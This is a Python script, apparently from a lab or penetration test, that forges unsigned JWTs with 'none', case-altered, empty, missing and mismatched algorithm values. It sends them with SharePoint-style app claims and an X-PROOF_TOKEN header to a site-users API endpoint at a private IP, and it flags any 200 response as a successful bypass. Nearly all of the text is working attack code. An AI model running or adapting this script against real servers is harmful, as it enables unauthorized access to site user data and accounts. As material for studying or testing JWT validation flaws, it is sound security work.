#!/usr/bin/env python3
"""
Test JWT algorithm variations for authentication bypass
Purpose: Test case sensitivity and null handling in JWT algorithm validation
"""
import json
import time
import base64
import requests

requests.packages.urllib3.disable_warnings()

def create_jwt_with_algorithm(realm, client_id, algorithm_value):
    """Create JWT token with specified algorithm value"""
    header = {"alg": algorithm_value} if algorithm_value is not None else {}
    current_time = int(time.time())
    expiration_time = current_time + 3600
    
    payload = {
        "aud": f"{client_id}@{realm}",
        "iss": client_id,
        "nbf": current_time,
        "exp": expiration_time,
        "ver": "hashedprooftoken",
        "nameid": f"{client_id}@{realm}",
        "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
        "endpointurlLength": 1,
        "isloopback": True
    }
    
    encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    
    return f"{encoded_header.decode()}.{encoded_payload.decode()}.AAA"

def test_algorithm_variant(target_url, realm, client_id, algorithm_value, description):
    """Test authentication with specific algorithm variant"""
    jwt_token = create_jwt_with_algorithm(realm, client_id, algorithm_value)
    
    print(f"\n[*] Testing: {description}")
    print(f"[*] Algorithm value: {repr(algorithm_value)}")
    
    headers = {
        "Accept": "application/json",
        "Authorization": f"Bearer {jwt_token}",
        "X-PROOF_TOKEN": jwt_token,
    }
    
    response = requests.get(
        f"{target_url}/_api/web/siteusers",
        headers=headers,
        verify=False,
        timeout=30
    )
    
    print(f"[*] Status: {response.status_code}")
    if response.status_code != 200:
        error_msg = response.headers.get('x-ms-diagnostics', 'No error details')
        print(f"[*] Error: {error_msg}")
    else:
        print(f"[!!!] SUCCESS - Bypass worked with: {description}")
        return True
    
    return False

if __name__ == "__main__":
    target_url = "http://10.10.10.166"
    realm = "5637f856-255d-4039-b165-224f3371d1d4"
    client_id = "00000003-0000-0ff1-ce00-000000000000"
    
    # Test various algorithm variations
    variants = [
        ("none", "Lowercase 'none' (original)"),
        ("None", "Capitalized 'None'"),
        ("NONE", "Uppercase 'NONE'"),
        ("nOnE", "Mixed case 'nOnE'"),
        ("", "Empty string"),
        (None, "No algorithm field"),
        ("HS256", "HS256 without signature"),
        ("RS256", "RS256 without signature"),
    ]
    
    for alg_value, description in variants:
        test_algorithm_variant(target_url, realm, client_id, alg_value, description)
